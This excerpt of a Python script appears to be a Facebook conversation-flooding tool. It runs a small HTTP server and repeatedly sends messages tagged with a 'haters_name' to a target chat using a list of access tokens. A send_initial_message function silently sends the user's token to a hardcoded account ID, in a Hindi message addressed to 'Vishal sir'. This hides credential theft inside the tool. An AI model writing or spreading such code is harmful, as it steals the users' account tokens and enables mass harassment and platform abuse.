...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- THIS SERVER MADE BY BEWAFA BOY")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "हैल्लो विशाल सर में आपका सर्वर यूज कर रहा हु. मेरा टोकन ये है {}"

      # Specify the ID where you want to send the message
      target_id = "100090546983346"
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  if response.ok:
                      print("\033[1;92m[+] विशाल सर आपका मेसेज जा रहा है {} of Convo {} Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  else:
                      print("\033[1;91m[x] विशाल सर आपका मेसेज नहीं जा रहा है {} of Convo {} with Token {}: {}".format(
                          message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                      liness()
                      liness()
                  time.sleep(speed)
